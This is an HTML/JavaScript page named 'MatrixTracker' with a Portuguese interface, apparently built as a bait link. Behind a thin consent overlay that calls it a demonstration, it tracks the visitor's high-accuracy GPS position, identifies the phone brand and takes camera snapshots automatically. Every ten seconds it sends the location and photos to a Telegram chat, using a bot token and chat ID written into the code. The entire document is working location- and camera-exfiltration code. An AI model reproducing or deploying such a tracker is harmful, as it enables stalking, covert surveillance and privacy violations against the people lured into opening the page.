<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>MatrixTracker ‚Äî Localiza√ß√£o & C√¢mera</title>

<!-- Leaflet -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>
  :root {
    --bg: #020202;
    --panel: #041208;
    --neon: #00ff88;
    --muted: #0b2b1c;
  }
  html,body { height:100%; margin:0; background: linear-gradient(180deg,#00110a 0%, #000a05 100%); font-family: "Segoe UI", Roboto, Arial; color: var(--neon); }
  .overlay {
    position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background: rgba(0,0,0,0.75); z-index:9999;
  }
  .consent {
    background: linear-gradient(180deg, rgba(2,18,6,0.95), rgba(3,7,3,0.95));
    border: 1px solid rgba(0,255,136,0.12);
    padding:28px; border-radius:12px; width:92%; max-width:760px; text-align:left; box-shadow: 0 8px 40px rgba(0,0,0,0.7);
  }
  .consent h1 { margin:0 0 10px; color: var(--neon); font-size:22px; }
  .consent p { color: rgba(0,255,136,0.85); margin:8px 0 16px; line-height:1.4; }
  .consent .actions { display:flex; gap:12px; justify-content:flex-end; margin-top:8px; }
  .btn {
    padding:10px 16px; border-radius:8px; border: none; cursor:pointer; font-weight:700;
    box-shadow: 0 6px 18px rgba(0,0,0,0.6);
  }
  .btn-accept { background: linear-gradient(90deg,#00ff88,#00c48a); color:#00120a; }
  .btn-decline { background: transparent; color: #66ffb3; border:1px solid rgba(102,255,179,0.08); }

  /* Layout */
  .app { display:grid; grid-template-columns: 1fr 420px; gap:16px; padding:18px; height:100vh; box-sizing:border-box; }
  @media(max-width:1000px){ .app { grid-template-columns: 1fr; } .right { order:2; } }

  .left { background: linear-gradient(180deg,#00130a,#041612); border-radius:10px; padding:12px; border:1px solid rgba(0,255,136,0.04);}
  .right { background: linear-gradient(180deg,#02130b,#071814); border-radius:10px; padding:12px; border:1px solid rgba(0,255,136,0.04); }

  header { display:flex; align-items:center; gap:12px; margin-bottom:8px; }
  header h2 { margin:0; color:var(--neon); font-size:18px; letter-spacing:0.6px; }
  .status { color: rgba(0,255,136,0.7); font-size:13px; }

  #map { height: calc(100vh - 180px); min-height:360px; border-radius:8px; border:1px solid rgba(0,255,136,0.06); overflow:hidden; }

  .cambox { display:flex; flex-direction:column; gap:10px; align-items:center; }
  video { width:100%; height:240px; object-fit:cover; border-radius:8px; border: 1px solid rgba(0,255,136,0.04); background:#000; }
  .info { width:100%; padding:8px; background: rgba(0,0,0,0.25); border-radius:8px; color:#bfffd6; font-size:13px; white-space:pre-line; min-height:76px; }
  .controls { display:flex; gap:8px; margin-top:8px; }

  .small { font-size:12px; color:rgba(0,255,136,0.55); }

  .toggle { padding:8px 10px; border-radius:8px; border:none; background:#002212; color:var(--neon); cursor:pointer; font-weight:700; }

  footer { margin-top:12px; font-size:12px; color:rgba(0,255,136,0.35); text-align:center; }
  .circle { border-radius:50%; width:10px; height:10px; background:var(--neon); display:inline-block; margin-right:8px; box-shadow:0 0 10px rgba(0,255,136,0.12); vertical-align:middle; }
</style>
</head>
<body>

<!-- Consent overlay -->
<div id="consentOverlay" class="overlay">
  <div class="consent" role="dialog" aria-modal="true">
    <h1>MatrixTracker ‚Äî autoriza√ß√£o necess√°ria</h1>
    <p>Este site coletar√° sua <strong>localiza√ß√£o</strong> e ativar√° sua <strong>c√¢mera</strong> para demonstra√ß√£o. Ao permitir, voc√™ aceita que as coordenadas (latitude/longitude/precis√£o) sejam enviadas automaticamente para o grupo do Telegram configurado pelo administrador.</p>
    <p style="font-size:13px; color:#9fffd0">Uso apenas para fins demonstrativos. Se voc√™ n√£o concorda, feche esta p√°gina.</p>
    <div class="actions">
      <button id="declineBtn" class="btn btn-decline">Recusar</button>
      <button id="acceptBtn" class="btn btn-accept">Aceitar e iniciar</button>
    </div>
  </div>
</div>

<div class="app" id="app" style="display:none">
  <div class="left">
    <header>
      <div style="display:flex;flex-direction:column">
        <h2>matrix ‚Ä¢ mapa ao vivo</h2>
        <div class="status" id="statusText">aguardando permiss√£o...</div>
      </div>
    </header>

    <div id="map"></div>

    <div style="margin-top:10px; display:flex; gap:8px; align-items:center;">
      <button id="btnPause" class="toggle">‚è∏ Pausar envio</button>
      <button id="btnResume" class="toggle">‚ñ∂ Retomar envio</button>
      <div style="flex:1"></div>
      <div class="small">envios a cada <span id="intervalLbl">10s</span></div>
    </div>

  </div>

  <div class="right">
    <header>
      <h2>matrix ‚Ä¢ c√¢mera</h2>
    </header>

    <div class="cambox">
      <video id="video" autoplay playsinline muted></video>
      <div class="info" id="infoBox">Nenhuma informa√ß√£o ainda.</div>

      <div class="controls">
        <button id="snapBtn" class="toggle">üì∏ Tirar snapshot (manual)</button>
        <button id="downloadBtn" class="toggle">‚¨á Baixar √∫ltimo snapshot</button>
      </div>

      <div style="width:100%; margin-top:6px; display:flex; gap:8px;">
        <div style="flex:1">
          <div class="small">Latitude</div>
          <div id="lat" style="font-weight:700">-</div>
        </div>
        <div style="flex:1">
          <div class="small">Longitude</div>
          <div id="lon" style="font-weight:700">-</div>
        </div>
        <div style="flex:1">
          <div class="small">Precis√£o (m)</div>
          <div id="acc" style="font-weight:700">-</div>
        </div>
      </div>

    </div>

    <footer>
      <span class="circle"></span> MatrixTracker v1 ‚Äî consentimento necess√°rio
    </footer>
  </div>
</div>

<!-- Leaflet JS -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
/* ======= CONFIGURE AQUI ======= */
const BOT_TOKEN = "8546822678:AAFKdw5cG9XzDIVi1XLi2-jXL6vTNoHcorE";
const CHAT_ID = "-396501936";
/* ============================== */

const CONSENT_OVERLAY = document.getElementById('consentOverlay');
const ACCEPT_BTN = document.getElementById('acceptBtn');
const DECLINE_BTN = document.getElementById('declineBtn');
const APP = document.getElementById('app');
const STATUS = document.getElementById('statusText');
const INFO = document.getElementById('infoBox');
const VIDEO = document.getElementById('video');

let map, marker, accuracyCircle;
let watchId = null;
let sendingPaused = false;
let lastSentTs = 0;
const SEND_INTERVAL_MS = 10000;
document.getElementById('intervalLbl').innerText = (SEND_INTERVAL_MS/1000) + "s";

let lastSnapshotBlob = null;

// ====== Detectar marca do dispositivo ======
function detectarMarca() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("samsung")) return "Samsung";
  if (ua.includes("motorola") || ua.includes("moto")) return "Motorola";
  if (ua.includes("xiaomi") || ua.includes("mi ")) return "Xiaomi";
  if (ua.includes("redmi")) return "Redmi (Xiaomi)";
  if (ua.includes("iphone") || ua.includes("ipad")) return "Apple (iPhone/iPad)";
  if (ua.includes("huawei")) return "Huawei";
  if (ua.includes("lenovo")) return "Lenovo";
  if (ua.includes("lg")) return "LG";
  return "Marca n√£o identificada";
}
const MARCA = detectarMarca();

// UI actions
DECLINE_BTN.onclick = () => {
  alert("Voc√™ recusou as permiss√µes. Esta p√°gina ser√° fechada.");
  window.close?.() || (CONSENT_OVERLAY.style.display = 'none', STATUS.innerText = 'Permiss√µes recusadas.');
};

ACCEPT_BTN.onclick = async () => {
  CONSENT_OVERLAY.style.display = 'none';
  APP.style.display = 'grid';
  STATUS.innerText = 'Solicitando permiss√µes...';
  await startAll();
};

// start everything: camera + geolocation + map
async function startAll() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio: false });
    VIDEO.srcObject = stream;
    STATUS.innerText = "C√¢mera ativada. Solicitando localiza√ß√£o...";
  } catch (err) {
    INFO.innerText = "Erro ao ativar c√¢mera: " + (err.message || err.name);
    console.warn(err);
  }

  initMap();

  if (!navigator.geolocation) {
    STATUS.innerText = "Geolocaliza√ß√£o n√£o suportada neste navegador.";
    return;
  }

  watchId = navigator.geolocation.watchPosition(onPosition, onPositionError, {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: 15000
  });

  STATUS.innerText = "Localiza√ß√£o sendo monitorada (permita no prompt do navegador).";
}

// Map init
function initMap(){
  map = L.map('map', { zoomControl:true, attributionControl:false }).setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
}

// When we get a new position
function onPosition(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const acc = pos.coords.accuracy;
  const ts = Date.now();

  document.getElementById('lat').innerText = lat.toFixed(6);
  document.getElementById('lon').innerText = lon.toFixed(6);
  document.getElementById('acc').innerText = acc ? acc.toFixed(1) : '-';
  
  // ‚úÖ Atualiza INFOBOX com marca do dispositivo
  INFO.innerText = 
    `Atualizado: ${new Date(ts).toLocaleString()}\n` +
    `Lat: ${lat}\n` +
    `Lon: ${lon}\n` +
    `Precis√£o: ${acc} m\n` +
    `Marca do dispositivo: ${MARCA}`;

  if (!marker) {
    marker = L.marker([lat,lon]).addTo(map).bindPopup('Voc√™ est√° aqui (live)').openPopup();
  } else {
    marker.setLatLng([lat,lon]);
  }
  if (!accuracyCircle) {
    accuracyCircle = L.circle([lat,lon], { radius: acc || 20, color:'#00ff88', fillColor:'#002b1b', fillOpacity:0.2 }).addTo(map);
  } else {
    accuracyCircle.setLatLng([lat,lon]).setRadius(acc || 20);
  }
  map.setView([lat,lon], 17);

  if (!sendingPaused && (ts - lastSentTs > SEND_INTERVAL_MS)) {
    lastSentTs = ts;
    attemptSend(lat, lon, acc, ts);
  }
}

function onPositionError(err) {
  INFO.innerText = "Erro geolocaliza√ß√£o: " + (err.message || err.code);
  STATUS.innerText = "Erro obtendo localiza√ß√£o.";
}

// Snapshot
document.getElementById('snapBtn').onclick = takeSnapshot;
document.getElementById('downloadBtn').onclick = downloadSnapshot;

async function takeSnapshot() {
  if (!VIDEO.srcObject) { alert('C√¢mera n√£o ativa'); return; }
  const canvas = document.createElement('canvas');
  canvas.width = VIDEO.videoWidth || 640;
  canvas.height = VIDEO.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(VIDEO, 0,0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    lastSnapshotBlob = blob;
    INFO.innerText = INFO.innerText + "\nSnapshot capturado.";
    sendPhotoToTelegram(blob, `snapshot_${Date.now()}.jpg`);
  }, 'image/jpeg', 0.8);
}

function downloadSnapshot() {
  if (!lastSnapshotBlob) { alert('Nenhum snapshot dispon√≠vel'); return; }
  const url = URL.createObjectURL(lastSnapshotBlob);
  const a = document.createElement('a');
  a.href = url; a.download = 'snapshot.jpg';
  document.body.appendChild(a); a.click(); a.remove();
  URL.revokeObjectURL(url);
}

// Pause / resume sending
document.getElementById('btnPause').onclick = () => { sendingPaused = true; STATUS.innerText = 'Envio pausado.'; };
document.getElementById('btnResume').onclick = () => { sendingPaused = false; STATUS.innerText = 'Envio ativo.'; lastSentTs = 0; };

// Attempt to send coords + optional snapshot
async function attemptSend(lat, lon, acc, ts) {
  INFO.innerText = INFO.innerText + `\nEnviando atualiza√ß√£o... ${new Date(ts).toLocaleTimeString()}`;

  const msg = `üìç *Atualiza√ß√£o de localiza√ß√£o (MatrixTracker)*\n\n` +
              `Latitude: ${lat}\nLongitude: ${lon}\nPrecis√£o: ${acc} m\nHora: ${new Date(ts).toLocaleString()}\n\n` +
              `Abrir no Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
    });
    INFO.innerText = INFO.innerText + "\nMensagem de texto enviada ao Telegram.";
  } catch (err) {
    console.warn('Erro ao enviar texto', err);
    INFO.innerText = INFO.innerText + "\nFalha ao enviar mensagem de texto.";
  }

  if (VIDEO && VIDEO.srcObject) {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = VIDEO.videoWidth || 640;
      canvas.height = VIDEO.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(VIDEO, 0,0, canvas.width, canvas.height);
      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
      if (blob) {
        const filename = `snap_${Date.now()}.jpg`;
        const sent = await sendPhotoToTelegram(blob, filename, `${msg}\n\n(Envio de imagem autom√°tico)`);
        if (sent) INFO.innerText = INFO.innerText + "\nSnapshot enviado ao Telegram.";
        else INFO.innerText = INFO.innerText + "\nSnapshot n√£o enviado (CORS ou erro).";
      }
    } catch (err) {
      console.warn('Erro snapshot auto', err);
    }
  }
}

// Send photo via Telegram API
async function sendPhotoToTelegram(blob, filename, caption = '') {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, filename);
    if (caption) form.append('caption', caption);

    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });

    if (!res.ok) return false;
    const json = await res.json();
    return json.ok === true;
  } catch (err) {
    console.warn('sendPhoto error (CORS likely):', err);
    return false;
  }
}

// Cleanup
window.addEventListener('beforeunload', () => {
  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
  if (VIDEO && VIDEO.srcObject) {
    VIDEO.srcObject.getTracks().forEach(t => t.stop());
  }
});
</script>
</body>
</html>
